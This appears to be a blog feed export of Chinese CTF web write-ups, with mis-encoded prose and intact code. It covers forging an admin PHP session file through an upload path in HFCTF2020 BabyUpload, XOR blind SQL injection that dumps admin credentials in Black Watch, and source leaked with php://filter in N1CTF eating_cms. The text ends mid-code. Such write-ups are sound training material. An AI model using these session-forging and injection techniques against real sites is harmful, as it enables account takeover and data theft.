double-quoted-string">"/var/babyctf/"</span> <span class="token operator">.</span> <span class="token variable">$attr</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$attr</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"private"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$dir_path</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"_"</span> <span class="token operator">.</span> <span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sha256"</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"download"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file not exist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/force-download'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Length: '</span> <span class="token operator">.</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Disposition: attachment; filename="'</span> <span class="token operator">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"downloaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æ˜¾ç„¶ï¼Œåªè¦è®©sessionä¸ºadminå°±èƒ½æ‹¿åˆ°flagã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820142952016.png"></p><p>å…ˆæµ‹è¯•äº†ä¸‹ä¸Šä¼ ï¼Œæ²¡æœ‰åé¦ˆï¼Œå¥‡æ€ªã€‚</p><p>å†è¯•è¯•ä¸‹è½½</p><blockquote><p>phpçš„sessioné»˜è®¤å­˜å‚¨æ–‡ä»¶åæ˜¯sess_+PHPSESSIDçš„å€¼</p></blockquote><p>sessionä¿å­˜è·¯å¾„å’Œä¸Šä¼ è·¯å¾„ä¸€è‡´ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¸Šä¼ è‡ªå·±æ„é€ çš„sessionã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820160430631.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820155422265.png"></p><pre class="line-numbers language-none"><code class="language-none">direction&#x3D;download&amp;filename&#x3D;sess_d7bd37299f06fbba3ab39c8a8008aad2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820155355360.png"></p><p>æ ¹æ®ä¹‹å‰åšçš„ä¸€é“é¢˜é‡Œçš„å…³äºphpç³»åˆ—åŒ–å¼•æ“çŸ¥è¯†ç‚¹<a href="https://syunaht.com/p/3063917200.html#toc-heading-5">åˆ·é¢˜ç¬”è®°:bestphpâ€™s revenge</a></p><blockquote><p>php_binaryå¼•æ“:é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼</p></blockquote><p>å¯çŸ¥è¿™ç”¨çš„æ˜¯php_binaryå¼•æ“</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);session_save_path(&quot;D:\\phpstudy_pro\\WWW\\localhost&quot;);session_start();$_SESSION[&#39;username&#39;] &#x3D; &#39;admin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆåï¼ŒæŠŠæ–‡ä»¶åæ”¹ä¸ºsessï¼Œç”¨<code>hash_file()</code>å‡½æ•°è®¡ç®—ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·ï¼ŒæŒ‰ç…§è¿™ä¸¤è¡Œä»£ç ï¼Œä¸Šä¼ çš„æ–‡ä»¶åå°±æ˜¯sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820161223950.png"></p><p>ä¸Šä¼ éœ€è¦BODYå‚æ•°ï¼Œæ‰€ä»¥æ‹¿postmanæ•´å§</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820162158835.png"></p><p>å†è¯•è¯•æœ‰æ²¡æœ‰ä¸Šä¼ æˆåŠŸã€‚</p><pre class="line-numbers language-none"><code class="language-none">direction&#x3D;download&amp;filename&#x3D;sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HFCTF2020-BabyUpload/image-20210820162241097.png"></p><p>ç„¶åè¿˜éœ€è¦éªŒè¯success.txt</p><p>å…ˆæŸ¥æŸ¥<code>file_exists()</code>æœ‰æ²¡æœ‰æ¼æ´ï¼Œç™¾åº¦åˆ°å¯ä»¥/file/**/../checkfileè¿™æ ·åˆ©ç”¨ï¼Œå¯æƒœåœ¨è¿™ç”¨ä¸ä¸Šã€‚</p><blockquote><p>file_exists()å‡½æ•°æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚</p></blockquote><p>è¯¥å‡½æ•°æ˜¯æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•ï¼Œæ‰€ä»¥åˆ©ç”¨atträ¸Šä¼ ä¸ªsuccess.txtæ–‡ä»¶å¤¹å³å¯ã€‚</p><p>ä¸Šä¼ åæŠŠcookieé‡Œçš„PHPSESSIDæ”¹ä¸º<code>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code>å³å¯æ‹¿åˆ°flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[Black Watch å…¥ç¾¤é¢˜]Web</title>
      <link href="/p/4138483003.html"/>
      <url>/p/4138483003.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/image-20210820105016300.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æŠ“åŒ…ï¼Œçœ‹åˆ°æœ‰?id</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/image-20210820120740418.png"></p><p>è€è§„çŸ©ï¼Œå…ˆfuzzä¸€ä¸‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web/image-20210820120847396.png"></p><p>å•å¼•å·åŒå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™å¯å’‹æ•´</p><p>è¯•è¯•1^1,1^0ï¼Œå¯è¡Œã€‚é‚£æ‡‚äº†ï¼Œæ˜¯å¼‚æˆ–ç›²æ³¨ã€‚</p><p>è·‘è„šæœ¬</p><pre class="line-numbers language-none"><code class="language-none">åº“newsè¡¨admin,contents<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>adminè¡¨çš„å­—æ®µ</p><pre class="line-numbers language-none"><code class="language-none">id,username,password,is_enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">username:aba004e4,b822ac37password:f8c1a48a,efce82ab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>contentsè¡¨çš„å­—æ®µ</p><pre class="line-numbers language-none"><code class="language-none">id,title,content,is_enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿b822ac37ï¼Œefce82abç™»é™†ä¸‹ï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[N1CTF 2018]eating_cms</title>
      <link href="/p/2163136062.html"/>
      <url>/p/2163136062.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[systemæ³¨é‡Š|systemæ‰§è¡Œæ¼æ´|php system]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819221635361.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æœ‰ä¸ª/register.phpå¯ä»¥æ³¨å†Œç”¨æˆ·</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819221715070.png"></p><p><code>user.php?page=guest</code>ï¼Œç¬¬ä¸€ååº”å…ˆè¯•è¯•ä¼ªåè®®</p><p>guest.php</p><pre class="line-numbers language-none"><code class="language-none">PD9waHAKaWYgKEZMQUdfU0lHICE9IDEpewogICAgZGllKCJ5b3UgY2FuIG5vdCB2aXNpdCBpdCBkaXJlY3RseSAiKTsKfQppbmNsdWRlICJ0ZW1wbGF0ZXMvZ3Vlc3QuaHRtbCI7Cj8+Cgo&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/guest.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>user.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>function.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token 